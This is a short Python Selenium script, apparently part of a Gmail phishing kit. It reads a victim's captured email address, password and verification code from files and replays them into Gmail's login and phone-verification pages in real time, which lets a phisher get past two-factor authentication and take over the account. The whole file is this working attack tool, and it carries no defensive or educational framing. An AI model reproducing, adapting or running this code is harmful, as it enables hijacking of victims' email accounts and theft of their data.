import time, os
from selenium import webdriver
emailPath = "gmailPhising/email.txt"
passwordPath = "gmailPhising/pass.txt"
codePath = "gmailPhising/code.txt"
femail = open(emailPath, "r")
email = femail.readline()
fpass = open(passwordPath, "r")
password = fpass.readline()
driver = webdriver.Firefox()
driver.get("https://www.gmail.com")
driver.find_element_by_name("identifier").send_keys(email.split("\n")[0])
driver.find_element_by_id("identifierNext").click()
time.sleep(1);
driver.find_element_by_name("password").send_keys(password.split("\n")[0])
driver.find_element_by_id("passwordNext").click()
while not os.path.exists(codePath):
    time.sleep(1)
fcode = open(codePath, "r")
code = fcode.readline()
driver.find_element_by_name("idvPin").send_keys(code.split("\n")[0])
driver.find_element_by_id("idvPreregisteredPhoneNext").click()


